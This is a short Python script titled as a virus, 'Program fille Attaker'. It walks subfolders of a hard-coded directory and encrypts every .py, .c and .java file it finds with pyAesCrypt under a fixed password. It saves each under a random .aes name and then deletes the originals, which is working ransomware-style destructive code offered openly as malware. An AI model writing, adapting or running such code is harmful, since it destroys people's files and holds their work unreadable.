# ### Virus-4: Program fille Attaker
# Features:
# 1. Search for program files
# 2. Destroy Program files from memory
# 3. Encrypt System file by making it unreadable

import os
import numpy as np
import shutil
import string
import pyAesCrypt     #If not available in Python, pip install pyAesCrypt

lcase=string.ascii_lowercase[:26]
ucase=string.ascii_uppercase[:26]
num="0123456789"

def main():
    prog=['.py','.c','.java']
    bufferSize = 64 * 1024
    password = "fool"
    dr="D:/Execution/1/"
    bkdr=dr[:-2]+"bak/"
    os.chdir(dr)
    print("Present Directory(main()): \n",os.getcwd())
    drlist=os.listdir(dr)
    ln=len(drlist)
    print(drlist)
    des=[]
    for i in drlist:
        if os.path.isdir(dr+i)==True:
            des.append(1)
        else:
            des.append(0)
    print(des)
    for i in range(len(des)):
        if des[i]==1:
            curdr=dr+drlist[i]+"/"
            curlist=os.listdir(curdr)
            print("Accessing: ",curdr)
            for i in curlist:
                if i[-3:] in prog or i[-5:] in prog or i[-2:] in prog or i[-4:] in prog:
                    #print("Program file: ",i)
                    inds=np.random.randint(0,len(lcase))
                    indi=np.random.randint(0,len(num))
                    pyAesCrypt.encryptFile(curdr+i, curdr+lcase[inds]+ucase[inds]+num[indi]+".aes", password, bufferSize)
                    
            for i in curlist:
                if i[-3:] in prog or i[-5:] in prog or i[-2:] in prog:
                    os.remove(curdr+i)

if __name__=="__main__":
    main()

